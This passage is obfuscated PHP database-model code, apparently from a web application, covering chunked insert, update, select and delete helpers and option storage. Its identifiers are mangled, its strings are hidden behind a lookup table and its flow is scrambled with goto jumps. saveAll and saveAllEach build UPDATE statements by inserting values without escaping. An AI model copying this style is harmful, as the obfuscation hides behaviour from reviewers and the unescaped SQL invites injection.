json_encode_force($dò¼ŠÄØÔë[$DëÅôŸœÁí]); } break; case $C‰…Ã¢İ¢[319]: if ($dò¼ŠÄØÔë[$DëÅôŸœÁí] === $C‰…Ã¢İ¢[33]) { unset($dò¼ŠÄØÔë[$DëÅôŸœÁí]); } break; case $C‰…Ã¢İ¢[320]: $dò¼ŠÄØÔë[$DëÅôŸœÁí] = $cŒ½¦£ÃÂ®[1]; default: break; } } if ($d‡ÆÌ¤³¤œ == $C‰…Ã¢İ¢[353]) { $F‹“ÇÂÚÚé = strtolower($this->db->getDbType()); if (strpos($F‹“ÇÂÚÚé, $C‰…Ã¢İ¢[9]) !== 0) { return; } $FºÌ³–™ÎÔ = $this->field(!0)->fields; $Eä…Ê–‹…ƒ = $FºÌ³–™ÎÔ[$C‰…Ã¢İ¢[248]]; if (isset($FºÌ³–™ÎÔ[$C‰…Ã¢İ¢[247]])) { unset($Eä…Ê–‹…ƒ[$FºÌ³–™ÎÔ[$C‰…Ã¢İ¢[247]]]); } foreach ($Eä…Ê–‹…ƒ as $fĞÎ¬áÑ–™ => $d‡ÆÌ¤³¤œ) { if (!isset($dò¼ŠÄØÔë[$fĞÎ¬áÑ–™])) { $dò¼ŠÄØÔë[$fĞÎ¬áÑ–™] = $C‰…Ã¢İ¢[33]; } } } } private function dataAfterFilter(&$AƒÛ ßÁó) { $e¡°²¯óËç =& $_SERVER[¹Ò‹Ò¹]; foreach ($this->dataAuto as $E…í×¿Ş¯İ) { $dÉ‰Ÿ›®ºŒ = $E…í×¿Ş¯İ[0]; if (!in_array($e¡°²¯óËç[355], explode($e¡°²¯óËç[47], $E…í×¿Ş¯İ[2]))) { continue; } if (!isset($AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ])) { continue; } switch (trim($E…í×¿Ş¯İ[3])) { case $e¡°²¯óËç[317]: case $e¡°²¯óËç[318]: $F”Ù¢ëø‘¸ = isset($E…í×¿Ş¯İ[4]) ? (array) $E…í×¿Ş¯İ[4] : array(); array_unshift($F”Ù¢ëø‘¸, $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ]); if ($e¡°²¯óËç[317] == $E…í×¿Ş¯İ[3]) { $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] = call_user_func_array($E…í×¿Ş¯İ[1], $F”Ù¢ëø‘¸); } else { $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] = call_user_func_array(array(&$this, $E…í×¿Ş¯İ[1]), $F”Ù¢ëø‘¸); } break; case $e¡°²¯óËç[269]: $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] = $AƒÛ ßÁó[$E…í×¿Ş¯İ[1]]; break; case $e¡°²¯óËç[290]: $a¾‘§ó¦…É = $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ]; $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] = json_decode($a¾‘§ó¦…É, !0); if (is_null($AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ])) { $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] = $a¾‘§ó¦…É; } break; case $e¡°²¯óËç[319]: if ($AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] === $e¡°²¯óËç[33]) { unset($AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ]); } break; case $e¡°²¯óËç[320]: $AƒÛ ßÁó[$dÉ‰Ÿ›®ºŒ] = $E…í×¿Ş¯İ[1]; default: break; } } } public function saveAll($dåÅä¬”®‡) { goto aºÕ¥š¯Ô; F¤ÖËß¨Ë£: $Aƒø´ÙæÒµ = array(); $B¶£öÜ¯¹ = count($dåÅä¬”®‡); for ($d•ê™êŒ© = 0; $d•ê™êŒ© < $B¶£öÜ¯¹; $d•ê™êŒ©++) { $AœÉ®”¬‚¶ = $dåÅä¬”®‡[$d•ê™êŒ©]; if (!is_array($AœÉ®”¬‚¶) || count($AœÉ®”¬‚¶) != 4) { continue; } $DåÈŒ˜¿‹ù = "\x55\x50\104\x41\x54\x45\40\x60{$Bù‚Åè½ÃÜ}\x60\x20\123\105\124\40{$AœÉ®”¬‚¶[2]}\40\x3d\x20\103\x41\123\105\40{$AœÉ®”¬‚¶[0]}\40\xa"; if ($Eºá¸í¥Ç == 0) { $E»šĞ¢Å‘„ = $DåÈŒ˜¿‹ù; } $Aƒø´ÙæÒµ[] = $bŞÆ”òôØñ[115] . $AœÉ®”¬‚¶[1] . $bŞÆ”òôØñ[115]; $Eºá¸í¥Ç++; $E»šĞ¢Å‘„ .= "\40\127\110\x45\x4e\x20\47{$AœÉ®”¬‚¶[1]}\47\x20\x54\x48\x45\x4e\40\x27{$AœÉ®”¬‚¶[3]}\47\40\xa"; if ($Eºá¸í¥Ç == $bÔâğ™ || $d•ê™êŒ© == $B¶£öÜ¯¹ - 1) { goto CÖƒ¬ñí®À; CÖƒ¬ñí®À: $bğÙÛ¸« Í = implode($bŞÆ”òôØñ[47], $Aƒø´ÙæÒµ); $E»šĞ¢Å‘„ .= "\40\x45\x4e\104\x20\x20\127\x48\105\122\105\x20{$AœÉ®”¬‚¶[0]}\x20\111\x4e\x20\x28{$bğÙÛ¸« Í}\51\x20"; $this->execute($E»šĞ¢Å‘„); goto dîœÏÙ‚Ğ¸; dîœÏÙ‚Ğ¸: $Eºá¸í¥Ç = 0; $E»šĞ¢Å‘„ = $DåÈŒ˜¿‹ù; $this->chunkEventCheck(count($Aƒø´ÙæÒµ)); goto e¡½¸”À§; e¡½¸”À§: $Aƒø´ÙæÒµ = array(); goto F…Úº²·‚; F…Úº²·‚: } } goto aƒÒ®ÖÊ¶¼; aƒÒ®ÖÊ¶¼: $this->chunkEventSet(); goto C•“ÑèÂæä; aºÕ¥š¯Ô: $bŞÆ”òôØñ =& $_SERVER[¹Ò‹Ò¹]; $Bù‚Åè½ÃÜ = $this->tablePrefix . $this->tableName; $bÔâğ™ = self::SQL_WHERE_IN_CHUNK; goto eª³ó¹å¤; eª³ó¹å¤: $dåÅä¬”®‡ = is_array($dåÅä¬”®‡) ? $dåÅä¬”®‡ : array(); $E»šĞ¢Å‘„ = $bŞÆ”òôØñ[373]; $Eºá¸í¥Ç = 0; goto F¤ÖËß¨Ë£; C•“ÑèÂæä: } public function saveAllEach($fŠØ†¢·Ã¬) { $a„©–Ä¦µ„ =& $_SERVER[¹Ò‹Ò¹]; $cøğ¦Û½ù˜ = $this->tablePrefix . $this->tableName; foreach ($fŠØ†¢·Ã¬ as $C÷³îÈçõ³) { if (!is_array($C÷³îÈçõ³) || count($C÷³îÈçõ³) != 4) { continue; } $aœ×ßàÑ¸¾ = $C÷³îÈçõ³[0] . $a„©–Ä¦µ„[374] . $C÷³îÈçõ³[1] . $a„©–Ä¦µ„[115]; $B××„¸çÈ„ = $C÷³îÈçõ³[2] . $a„©–Ä¦µ„[374] . $C÷³îÈçõ³[3] . $a„©–Ä¦µ„[115]; $F„§´½Á = "\x75\160\144\x61\x74\x65\40{$cøğ¦Û½ù˜}\40\x73\x65\164\40{$B××„¸çÈ„}\40\x77\150\x65\x72\145\x20{$aœ×ßàÑ¸¾}\x3b"; $this->execute($F„§´½Á); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($F¢Õ°‘ã×Ö = false, $CğÔ†«ÎÌ´ = false) { $this->_chunkEvent = $F¢Õ°‘ã×Ö; $this->_chunkEventParam = $CğÔ†«ÎÌ´; } private function chunkEventCheck($Bêõ½ÅÊá‰) { if (!$this->_chunkEvent) { return; } $eÙ‘ò‡Š³ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $eÙ‘ò‡Š³[$_SERVER[¹Ò‹Ò¹][375]] = $Bêõ½ÅÊá‰; Hook::trigger($this->_chunkEvent, $eÙ‘ò‡Š³); } public function addAll($eÀÊùÕ°, $e ‡Ö÷†‘ß = array(), $c¸´×õ›¾ø = false) { goto b”§‡—”›²; Béê¡àè: if (empty($eÀÊùÕ°)) { $this->error = think_lang($e¾ŠÄƒ×ÏÉ[267]); return !1; } $e ‡Ö÷†‘ß = $this->_parseOptions($e ‡Ö÷†‘ß); foreach ($eÀÊùÕ° as $FÑ“•Û’¹Î => $cŸãÛ…„ø) { $eÀÊùÕ°[$FÑ“•Û’¹Î] = $this->_facade($cŸãÛ…„ø); $this->_beforeInsert($eÀÊùÕ°[$FÑ“•Û’¹Î], $e ‡Ö÷†‘ß); } goto e§äÕØÇé; b”§‡—”›²: $e¾ŠÄƒ×ÏÉ =& $_SERVER[¹Ò‹Ò¹]; ignore_timeout(); $CâìÌÜÒ¥ = self::SQL_WHERE_IN_CHUNK; goto Béê¡àè; e§äÕØÇé: if (method_exists($this->db, $e¾ŠÄƒ×ÏÉ[268])) { for ($AâÉôÚ»¯º = 0; $AâÉôÚ»¯º < count($eÀÊùÕ°); $AâÉôÚ»¯º += $CâìÌÜÒ¥) { $dæ“…Ç = array_slice($eÀÊùÕ°, $AâÉôÚ»¯º, $CâìÌÜÒ¥); if (!is_array($dæ“…Ç) || count($dæ“…Ç) == 0) { break; } $E¿›ÖŒœš = $this->db->insertAll($dæ“…Ç, $e ‡Ö÷†‘ß, $c¸´×õ›¾ø); $this->chunkEventCheck(count($dæ“…Ç)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eÀÊùÕ° as $FÑ“•Û’¹Î => $cŸãÛ…„ø) { $E¿›ÖŒœš = $this->db->insert($cŸãÛ…„ø, $e ‡Ö÷†‘ß, $c¸´×õ›¾ø); } $this->commit(); } if (!1 !== $E¿›ÖŒœš) { $e¬¥‰ÚğÄÉ = $this->getLastInsID(); if ($e¬¥‰ÚğÄÉ) { return $e¬¥‰ÚğÄÉ; } } return $E¿›ÖŒœš; goto cîÔ•İ±óæ; cîÔ•İ±óæ: } public function save($cíÈ¦ŠğÊÂ = '', $d‡†ÑÂ×ğï = array()) { goto cÉã´¨â‘; cÉã´¨â‘: $DÌœ„³îÒ =& $_SERVER[¹Ò‹Ò¹]; $EóÒ¡…Òä = self::SQL_WHERE_IN_CHUNK; $dƒîôŸ¾ƒ = $this->optionsValue(); goto FÔÂ’™ëğà; EåÇÉÆ‰ì¬: $eÖ©®Ìçù = $dƒîôŸ¾ƒ[$DÌœ„³îÒ[271]][$CŠÓ¸—†§][1]; $eÖ©®Ìçù = is_array($eÖ©®Ìçù) ? $eÖ©®Ìçù : array(); $DëŠÔÁ° = count($eÖ©®Ìçù); goto aˆò‹Öå¤É; aˆò‹Öå¤É: for ($eÂÎ¥¨É¨½ = 0; $eÂÎ¥¨É¨½ < $DëŠÔÁ°; $eÂÎ¥¨É¨½ += $EóÒ¡…Òä) { $A±îÚòéö¬ = array_slice($eÖ©®Ìçù, $eÂÎ¥¨É¨½, $EóÒ¡…Òä); if (!is_array($A±îÚòéö¬) || count($A±îÚòéö¬) == 0) { break; } $dƒîôŸ¾ƒ[$DÌœ„³îÒ[271]][$CŠÓ¸—†§][1] = $A±îÚòéö¬; $this->optionsValue($dƒîôŸ¾ƒ); $f¨á†¸Í­ += parent::save($cíÈ¦ŠğÊÂ, $d‡†ÑÂ×ğï); $this->chunkEventCheck(count($A±îÚòéö¬)); } $this->chunkEventSet(); return $f¨á†¸Í­; goto DÛŒˆ…­²‡; FÔÂ’™ëğà: $CŠÓ¸—†§ = $this->findWhereField($dƒîôŸ¾ƒ); if (!$CŠÓ¸—†§) { return parent::save($cíÈ¦ŠğÊÂ, $d‡†ÑÂ×ğï); } $f¨á†¸Í­ = 0; goto EåÇÉÆ‰ì¬; DÛŒˆ…­²‡: } public function add($AÀ´ÈÓ†Ã = '', $C³½¯‘íø = array(), $E…§Ï™ŒÁ÷ = false) { if ($this->addTaskStatus && is_array($AÀ´ÈÓ†Ã)) { $this->addTaskData[] = $AÀ´ÈÓ†Ã; return; } return parent::add($AÀ´ÈÓ†Ã, $C³½¯‘íø, $E…§Ï™ŒÁ÷); } public function parseWhereLike($B§©¿¯ÅÓŒ, $D‡˜æ¥Ñ„  = '', $DöòŸÂİ™ = false, &$EÒ·ô½åªç = false) { goto aĞ‘øôÌà; aĞ‘øôÌà: $EİÉ¸êµåÙ =& $_SERVER[¹Ò‹Ò¹]; $D¡Ó‘—’º‰ = $GLOBALS[$EİÉ¸êµåÙ[6]][$EİÉ¸êµåÙ[376]]; if (!$D¡Ó‘—’º‰[$EİÉ¸êµåÙ[377]]) { return $B§©¿¯ÅÓŒ; } goto F‚«ø®õ; BÎ„‹£ß•: foreach ($B§©¿¯ÅÓŒ as $f÷¯ê¥°ˆä => $eòÜõšç’İ) { if (is_array($eòÜõšç’İ) && count($eòÜõšç’İ) == 2 && $eòÜõšç’İ[0] == $EİÉ¸êµåÙ[378] && is_string($eòÜõšç’İ[1]) && substr($eòÜõšç’İ[1], 0, 1) == $EİÉ¸êµåÙ[379] && substr($eòÜõšç’İ[1], strlen($eòÜõšç’İ[1]) - 1, 1) == $EİÉ¸êµåÙ[379]) { goto bœ‡‰š¦óœ; d„¼£öˆ: $B›¢äé = $this->db->escapeString($B›¢äé); if (!strpos($BË½À¥¿„‰, $EİÉ¸êµåÙ[94])) { $BË½À¥¿„‰ = $EİÉ¸êµåÙ[380] . $BË½À¥¿„‰ . $EİÉ¸êµåÙ[380]; } if ($D¡Ó‘—’º‰[$EİÉ¸êµåÙ[381]]) { $B›¢äé = $EİÉ¸êµåÙ[115] . $B›¢äé . $EİÉ¸êµåÙ[115]; } goto aÁÃ½Ö¤¥š; bœ‡‰š¦óœ: $EÒ·ô½åªç = !0; $BË½À¥¿„‰ = is_string($f÷¯ê¥°ˆä) ? $f÷¯ê¥°ˆä : $D‡˜æ¥Ñ„ ; $B›¢äé = substr($eòÜõšç’İ[1], 1, strlen($eòÜõšç’İ[1]) - 2); goto d„¼£öˆ; aÁÃ½Ö¤¥š: $AÓö¦ø…[$Fù¾¢ğÙô›] = $EİÉ¸êµåÙ[382] . $BË½À¥¿„‰ . $EİÉ¸êµåÙ[383] . $B›¢äé . $EİÉ¸êµåÙ[384]; $Fù¾¢ğÙô›++; continue; goto Eñ÷š•ÙéÆ; Eñ÷š•ÙéÆ: } if (is_array($eòÜõšç’İ)) { $D‡˜æ¥Ñ„  = is_string($f÷¯ê¥°ˆä) ? $f÷¯ê¥°ˆä : $D‡˜æ¥Ñ„ ; $eòÜõšç’İ = $this->parseWhereLike($eòÜõšç’İ, $D‡˜æ¥Ñ„ , !0, $EÒ·ô½åªç); } if (is_numeric($f÷¯ê¥°ˆä)) { $AÓö¦ø…[$Fù¾¢ğÙô›] = $eòÜõšç’İ; $Fù¾¢ğÙô›++; } else { $AÓö¦ø…[$f÷¯ê¥°ˆä] = $eòÜõšç’İ; } } if ($EÒ·ô½åªç && !$DöòŸÂİ™) { trace_log(array($AÓö¦ø…, $B§©¿¯ÅÓŒ), $EİÉ¸êµåÙ[271]); } return $AÓö¦ø…; goto F‚ö½áÒ‘; F‚«ø®õ: if (!is_array($B§©¿¯ÅÓŒ)) { return $B§©¿¯ÅÓŒ; } $AÓö¦ø… = array(); $Fù¾¢ğÙô› = 0; goto BÎ„‹£ß•; F‚ö½áÒ‘: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($BÌ”ºÂÛåê = array()) { goto F× Í«‡¥; B¦­‘‡²…: return $A§”ßÀäŠÄ; goto E‡Ó˜‡…¤; Aù˜ë¸Šç: $DÜÃñÂÜœ¬ = is_array($DÜÃñÂÜœ¬) ? $DÜÃñÂÜœ¬ : array(); $A§”ßÀäŠÄ = null; for ($bÖÊ¹ÂŠŒÙ = 0; $bÖÊ¹ÂŠŒÙ < count($DÜÃñÂÜœ¬); $bÖÊ¹ÂŠŒÙ += $a„«Ä¹Ù±¸) { $EÏÙ·±Ğ»“ = array_slice($DÜÃñÂÜœ¬, $bÖÊ¹ÂŠŒÙ, $a„«Ä¹Ù±¸); if (!is_array($EÏÙ·±Ğ»“) || count($EÏÙ·±Ğ»“) == 0) { break; } $B¦ÆßŒ³Ñ´[$dïí¾”¢Ó«[271]][$D˜Ô­™¹§»][1] = $EÏÙ·±Ğ»“; $this->optionsValue($B¦ÆßŒ³Ñ´); $Aö‘†¼Ù¶ = parent::select($BÌ”ºÂÛåê); if (!$Aö‘†¼Ù¶) { continue; } $A§”ßÀäŠÄ = is_array($A§”ßÀäŠÄ) ? $A§”ßÀäŠÄ : array(); $A§”ßÀäŠÄ = array_merge($A§”ßÀäŠÄ, $Aö‘†¼Ù¶); } goto B¦­‘‡²…; FÈÉÖ†«Ú: $D˜Ô­™¹§» = $this->findWhereField($B¦ÆßŒ³Ñ´); if (!$D˜Ô­™¹§» || isset($B¦ÆßŒ³Ñ´[$dïí¾”¢Ó«[288]]) || isset($B¦ÆßŒ³Ñ´[$dïí¾”¢Ó«[349]])) { return parent::select($BÌ”ºÂÛåê); } $DÜÃñÂÜœ¬ = $B¦ÆßŒ³Ñ´[$dïí¾”¢Ó«[271]][$D˜Ô­™¹§»][1]; goto Aù˜ë¸Šç; F× Í«‡¥: $dïí¾”¢Ó« =& $_SERVER[¹Ò‹Ò¹]; $a„«Ä¹Ù±¸ = self::SQL_WHERE_IN_CHUNK; $B¦ÆßŒ³Ñ´ = $this->optionsValue(); goto FÈÉÖ†«Ú; E‡Ó˜‡…¤: } public function delete($dÙŠÚëŸ—Ú = array()) { goto B¢Œ©—«Î; Díãİìñ”Ä: return $F·¸é£°ö°; goto d¨‘äê…¬; CšÀ–ÛÚÖœ: $dã—ó‰¹ôˆ = $D®‰†”½£«[$eé¡‹°¬Ùº[271]][$B°‹ËÜ—‡¸][1]; $dã—ó‰¹ôˆ = is_array($dã—ó‰¹ôˆ) ? $dã—ó‰¹ôˆ : array(); for ($fä‰é…ñÁò = 0; $fä‰é…ñÁò < count($dã—ó‰¹ôˆ); $fä‰é…ñÁò += $B…†ÊÔ¡) { $cÛç•öÅÁñ = array_slice($dã—ó‰¹ôˆ, $fä‰é…ñÁò, $B…†ÊÔ¡); if (!is_array($cÛç•öÅÁñ) || count($cÛç•öÅÁñ) == 0) { break; } $D®‰†”½£«[$eé¡‹°¬Ùº[271]][$B°‹ËÜ—‡¸][1] = $cÛç•öÅÁñ; $this->optionsValue($D®‰†”½£«); $F·¸é£°ö° += parent::delete($dÙŠÚëŸ—Ú); } goto Díãİìñ”Ä; AáÚ¾‡È¯: $B°‹ËÜ—‡¸ = $this->findWhereField($D®‰†”½£«); if (!$B°‹ËÜ—‡¸) { return parent::delete($dÙŠÚëŸ—Ú); } $F·¸é£°ö° = 0; goto CšÀ–ÛÚÖœ; B¢Œ©—«Î: $eé¡‹°¬Ùº =& $_SERVER[¹Ò‹Ò¹]; $B…†ÊÔ¡ = self::SQL_WHERE_IN_CHUNK; $D®‰†”½£« = $this->optionsValue(); goto AáÚ¾‡È¯; d¨‘äê…¬: } private function findWhereField($Fó¨Ÿƒé™ˆ) { $f·–£å•îÃ =& $_SERVER[¹Ò‹Ò¹]; $C“¬”Û÷ŒŞ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Fó¨Ÿƒé™ˆ) || !is_array($Fó¨Ÿƒé™ˆ[$f·–£å•îÃ[271]])) { return !1; } foreach ($Fó¨Ÿƒé™ˆ[$f·–£å•îÃ[271]] as $FŒÌğ“çÓ => $CèÕ¬©šÓ¶) { if (is_array($CèÕ¬©šÓ¶) && isset($CèÕ¬©šÓ¶[0]) && is_string($CèÕ¬©šÓ¶[0]) && strtolower($CèÕ¬©šÓ¶[0]) == $f·–£å•îÃ[7] && is_array($CèÕ¬©šÓ¶[1]) && count($CèÕ¬©šÓ¶[1]) > $C“¬”Û÷ŒŞ) { ignore_timeout(); return $FŒÌğ“çÓ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\145\155\117\x70\164\x69\157\x6e"; public $field = array(); public function listData($aÇòí›Ğ„ = false, $f¥ĞÌ”ñ‡× = "\x6d\157\144\151\x66\x79\124\151\x6d\145", $C’÷é¹¤‡ = false) { $cÜ·†¯— = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cÜ·†¯—) { return $aÇòí›Ğ„ ? null : array(); } if (!$aÇòí›Ğ„) { $cÜ·†¯— = array_filter(array_values($cÜ·†¯—)); return array_sort_by($cÜ·†¯—, $f¥ĞÌ”ñ‡×, $C’÷é¹¤‡); } return $cÜ·†¯—[$_SERVER[¹Ò‹Ò¹][385] . $aÇòí›Ğ„]; } public function insert($Eöºëƒ¯­) { goto BÈÓœÙ”Ç”; a­îá‘è›: $cµ¶Œ¬‹¡Ç = $cµ¶Œ¬‹¡Ç ? $cµ¶Œ¬‹¡Ç : 0; $Eöºëƒ¯­[$CĞ‰Œ«ËÍ[388]] = ++$cµ¶Œ¬‹¡Ç; $Eöºëƒ¯­[$CĞ‰Œ«ËÍ[192]] = time(); goto b§±ˆ¤±·¼; BÈÓœÙ”Ç”: $CĞ‰Œ«ËÍ =& $_SERVER[¹Ò‹Ò¹]; $Eöºëƒ¯­ = array_field_key($Eöºëƒ¯­, $this->field); $cµ¶Œ¬‹¡Ç = Model($this->modelType)->get($CĞ‰Œ«ËÍ[386], $this->optionType . $CĞ‰Œ«ËÍ[387]); goto a­îá‘è›; b§±ˆ¤±·¼: $Eöºëƒ¯­[$CĞ‰Œ«ËÍ[83]] = time(); Model($this->modelType)->set($CĞ‰Œ«ËÍ[386], $cµ¶Œ¬‹¡Ç, $this->optionType . $CĞ‰Œ«ËÍ[387]); Model($this->modelType)->set($CĞ‰Œ«ËÍ[385] . $cµ¶Œ¬‹¡Ç, $Eöºëƒ¯­, $this->optionType); goto eÁè”—Úˆ¸; eÁè”—Úˆ¸: return $cµ¶Œ¬‹¡Ç; goto c¹˜–»‡÷ä; c¹˜–»‡÷ä: } public function update($c°ó¤ä²öò, $fğ¯†Ó¹«) { goto BŠŠÍˆ˜õÓ; A¬ªŠäš‚´: if (!$A„Ğó¿õšÊ) { return !1; } $fğ¯†Ó¹« = array_merge($A„Ğó¿õšÊ, $fğ¯†Ó¹«); $fğ¯†Ó¹«[$BÏ¾ğÄŠ·í[83]] = time(); goto FÒæ˜çï‹—; FÒæ˜çï‹—: return Model($this->modelType)->set($BÏ¾ğÄŠ·í[385] . $c°ó¤ä²öò, $fğ¯†Ó¹«, $this->optionType); goto BÓ–†ïìÛ…; BŠŠÍˆ˜õÓ: $BÏ¾ğÄŠ·í =& $_SERVER[¹Ò‹Ò¹]; $fğ¯†Ó¹« = array_field_key($fğ¯†Ó¹«, $this->field); $A„Ğó¿õšÊ = $this->listData($c°ó¤ä²öò); goto A¬ªŠäš‚´; BÓ–†ïìÛ…: } public function remove($D°¶½ğô) { return Model($this->modelType)->remove($_SERVER[¹Ò‹Ò¹][385] . $D°¶½ğô, $this->optionType); } public function clear() { $f×Œ²ÒŒ  =& $_SERVER[¹Ò‹Ò¹]; Model($this->modelType)->remove($f×Œ²ÒŒ [386], $this->optionType . $f×Œ²ÒŒ [387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($e‘ôêÕÜ§ì, $FìêÌÜµµ) { if (!$FìêÌÜµµ) { return !1; } $fŒ¸Å†Ÿ˜ö = $this->listData(); $fŒ¸Å†Ÿ˜ö = array_to_keyvalue($fŒ¸Å†Ÿ˜ö, $e‘ôêÕÜ§ì); return isset($fŒ¸Å†Ÿ˜ö[$FìêÌÜµµ]) ? $fŒ¸Å†Ÿ˜ö[$FìêÌÜµµ] : !1; } public function findByName($fîò¢èÅÆ›) { return $this->findByKey($_SERVER[¹Ò‹Ò¹][28], $fîò¢èÅÆ›); } protected function resetData($b‹ºµØ©Ñ…) { $Cö‡İ½ŠÎæ =& $_SERVER[¹Ò‹Ò¹]; $b‹ºµØ©Ñ… = is_array($b‹ºµØ©Ñ…) ? $b‹ºµØ©Ñ… : array(); $eàÆ‘øÎ¾ = array(); for ($cŞ²”ÁŒÔß = 0; $cŞ²”ÁŒÔß < count($b‹ºµØ©Ñ…); $cŞ²”ÁŒÔß++) { $eàÆ‘øÎ¾[$Cö‡İ½ŠÎæ[385] . $b‹ºµØ©Ñ…[$cŞ²”ÁŒÔß][$Cö‡İ½ŠÎæ[388]]] = $b‹ºµØ©Ñ…[$cŞ²”ÁŒÔß]; } return Model($this->modelType)->set($eàÆ‘øÎ¾, !1, $this->optionType); } private function getAutoName($d™”œÀ£ßÃ) { $b´·™¤Š¡÷ = array_to_keyvalue($this->listData(), $_SERVER[¹Ò‹Ò¹][28]); if (!$b´·™¤Š¡÷ || !isset($b´·™¤Š¡÷[$d™”œÀ£ßÃ])) { return $d™”œÀ£ßÃ; } for ($A‚¥ôïïÀ = 1; $A‚¥ôïïÀ < count($b´·™¤Š¡÷); $A‚¥ôïïÀ++) { $a©Õ Ğù›Æ = $d™”œÀ£ßÃ . "\x28{$A‚¥ôïïÀ}\51"; if (!isset($b´·™¤Š¡÷[$a©Õ Ğù›Æ])) { return $a©Õ Ğù›Æ; } } return $a©Õ Ğù›Æ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Eˆ–Ï—ÙÍô = false, $EİÆôËˆõ = '', $a„À¢õæÏÊ = false) { goto f™ŸåÏ‡ØÚ; A¤·ìÌ§¤¼: $this->cacheSet($EİÆôËˆõ, $e™ÙéÔíÖ¼); $e™ÙéÔíÖ¼ = array_merge($aİï£ö ĞŸ, $e™ÙéÔíÖ¼); return $Eˆ–Ï—ÙÍô ? $e™ÙéÔíÖ¼[$Eˆ–Ï—ÙÍô] : $e™ÙéÔíÖ¼; goto bÇ¥·ÁÀóÉ; aíËÀŠÊ‚î: $e™ÙéÔíÖ¼ = $this->where($e®öíÎÎŞ—)->select(); $e™ÙéÔíÖ¼ = array_to_keyvalue($e™ÙéÔíÖ¼, $F½Ü†¡æŞ‹[92], $F½Ü†¡æŞ‹[370]); foreach ($e™ÙéÔíÖ¼ as $fÙ‡Æƒè³Ğ => $eˆˆñğÑ¿Ø) { if ($a„À¢õæÏÊ || in_array($fÙ‡Æƒè³Ğ, $this->jsonField)) { $e™ÙéÔíÖ¼[$fÙ‡Æƒè³Ğ] = json_decode($eˆˆñğÑ¿Ø, !0); } } goto A¤·ìÌ§¤¼; E·¨µ½µÙ: $aİï£ö ĞŸ = is_array($aİï£ö ĞŸ) ? $aİï£ö ĞŸ : array(); if (is_array($e™ÙéÔíÖ¼)) { $e™ÙéÔíÖ¼ = array_merge($aİï£ö ĞŸ, $e™ÙéÔíÖ¼); return $Eˆ–Ï—ÙÍô ? isset($e™ÙéÔíÖ¼[$Eˆ–Ï—ÙÍô]) ? $e™ÙéÔíÖ¼[$Eˆ–Ï—ÙÍô] : null : $e™ÙéÔíÖ¼; } $e®öíÎÎŞ— = $this->filterWhere(array($F½Ü†¡æŞ‹[29] => $EİÆôËˆõ)); goto aíËÀŠÊ‚î; f™ŸåÏ‡ØÚ: $F½Ü†¡æŞ‹ =& $_SERVER[¹Ò‹Ò¹]; $e™ÙéÔíÖ¼ = $this->cacheGet($EİÆôËˆõ); $aİï£ö ĞŸ = $this->optionDefault($EİÆôËˆõ); goto E·¨µ½µÙ; bÇ¥·ÁÀóÉ: } public function set($Bç®„Ñ¸—‹, $bÀäæ­‘Ôä = false, $C°Ñœ‡±²÷ = '') { goto E–îéŞ‘; eÊÄ‘ÄŸÇ: $Bµ×ƒƒ£¢ = is_array($Bç®„Ñ¸—‹) ? $Bç®„Ñ¸—‹ : array($Bç®„Ñ¸—‹ => $bÀäæ­‘Ôä); foreach ($Bµ×ƒƒ£¢ as $eÙ¢ó©ªïó => $FçŒ‹åë) { if (is_array($FçŒ‹åë)) { $FçŒ‹åë = json_encode_force($FçŒ‹åë); } $this->checkLength($FçŒ‹åë, !1, $this->tableName . $CÔì‹å™[4] . $Bç®„Ñ¸—‹); $FçŒ‹åë = self::textEncode($FçŒ‹åë); $Bµ×ƒƒ£¢ = array($CÔì‹å™[29] => $C°Ñœ‡±²÷, $CÔì‹å™[92] => $eÙ¢ó©ªïó, $CÔì‹å™[370] => $FçŒ‹åë); $d…£çíŒÂŸ[] = $this->filterWhere($Bµ×ƒƒ£¢); } if (!$d…£çíŒÂŸ) { return !0; } goto aÍñÒŞµŒ; aÍñÒŞµŒ: return $this->addAll($d…£çíŒÂŸ, array(), !0); goto eÀ´éÑ‚¡Ú; E–îéŞ‘: $CÔì‹å™ =& $_SERVER[¹Ò‹Ò¹]; $this->cacheRemove($C°Ñœ‡±²÷); $d…£çíŒÂŸ = array(); goto eÊÄ‘ÄŸÇ; eÀ´éÑ‚¡Ú: } protected function optionDefault($C›¶‘Ä´—ˆ = '') { return !1; } public function setDeep($eâ‡Ëİğ, $FŠ¹”ë°° = false, $EƒæÌàÀ“ç = '') { $F³â³à´±­ = explode($_SERVER[¹Ò‹Ò¹][94], $eâ‡Ëİğ); $A”ÏÏ¹•÷ = $this->get(); array_set_value($A”ÏÏ¹•÷, $eâ‡Ëİğ, $FŠ¹”ë°°); $this->set($F³â³à´±­[0], $A”ÏÏ¹•÷[$F³â³à´±­[0]], $EƒæÌàÀ“ç); } public function remove($eóÙ·İÍíâ, $bÚÏÌä„ô = '') { $cçÖòåâ =& $_SERVER[¹Ò‹Ò¹]; $this->cacheRemove($bÚÏÌä„ô); $bˆ§ê®ğ‹ = $this->filterWhere(array($cçÖòåâ[92] => $eóÙ·İÍíâ, $cçÖòåâ[29] => $bÚÏÌä„ô)); if (is_null($eóÙ·İÍíâ)) { unset($bˆ§ê®ğ‹[$cçÖòåâ[92]]); } return 